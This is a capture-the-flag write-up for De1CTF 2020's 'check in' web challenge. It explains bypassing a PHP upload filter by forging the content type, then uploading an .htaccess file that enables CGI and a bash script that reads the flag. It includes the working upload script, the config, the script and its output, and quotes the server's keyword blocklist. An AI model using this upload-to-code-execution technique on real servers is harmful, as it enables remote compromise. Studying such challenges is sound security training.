# check in (web, 120pts)

> welcome to 2020De1ctf
>
> http://129.204.21.115

The site allows you to upload a single file to the server.

![webpage](./webpage.png)

The headers from the server indicate this we're working with PHP:

```
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
```

We attempted to upload several file types and came up with the following rules:

* PHP file extensions are banned (`filename error`)
* You can upload any other extension by setting the file type in the request to `image/png` (if you don't you get `filetype error`)
* Files cannot contain `perl|pyth|ph|auto|curl|base|>|rm|ruby|openssl|war|lua|msf|xter|telnet`
* You are allocated a random directory that all your files are uploaded to

Knowing this, we can upload a file that doesn't have an image extension by changing its content type to an image:

```js
const axios = require('axios');
const FormData = require('form-data');

const uploadFile = (contents, filename) => {
  const data = new FormData();
  data.append('fileUpload', contents, {
    filename,
    contentType: 'image/jpeg'
  });
  data.append('upload', 'submit');

  return axios.post('http://129.204.21.115/index.php', data, { headers: data.getHeaders() })
    .then(res => console.log(res.data))
    .catch(console.error);
};

uploadFile('test', 'test.txt');

// Your dir : uploads/d22230980be937c106887cabaf8507aa 
```

Navigating to `http://129.204.21.115/uploads/d22230980be937c106887cabaf8507aa/test.txt` returns `test` as expected.

We now have the ability to upload any non-PHP files but the files are echoed back to us so we can't execute anything.

We stumbled around here for a while before realising that the server is running [`Apache HTTP Server`](https://httpd.apache.org/)
and `.htaccess` files allow you to override configuration for the specific directory.  This makes sense considering all our files
are uploaded to the same directory.

Reading the [.htaccess documentation](https://httpd.apache.org/docs/2.4/howto/htaccess.html#cgi) we find that you can enable CGI
execution, so we should be able to execute a bash script and search for the flag.  Note that you need to make sure your script
[outputs a Content-Type header](https://httpd.apache.org/docs/trunk/howto/cgi.html#writing).

`.htaccess`
```
Options +ExecCGI
AddHandler cgi-script .sh
```

`solve.sh`
```shell script
#!/bin/bash
echo "Content-Type: text/plain"
echo ""
ls -lah /
exit 0
```

Uploading these files and accessing the bash script shows us the flag is at `/flag`:

```
total 80K
drwxr-xr-x   1 root root 4.0K May  4 08:15 .
drwxr-xr-x   1 root root 4.0K May  4 08:15 ..
-rwxr-xr-x   1 root root    0 May  4 08:15 .dockerenv
-rw-r--r--   1 root root  12K Oct  1  2019 anaconda-post.log
lrwxrwxrwx   1 root root    7 Oct  1  2019 bin -> usr/bin
drwxr-xr-x   3 root root 4.0K May  1 11:09 boot
drwxr-xr-x   5 root root  340 May  4 08:15 dev
drwxr-xr-x   1 root root 4.0K May  4 08:15 etc
-rw-r-xr-x   1 root root   42 May  1 13:17 flag
...
```

Change `ls -lah /` to `cat /flag` and reupload the script to get the flag:

```
De1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}
```
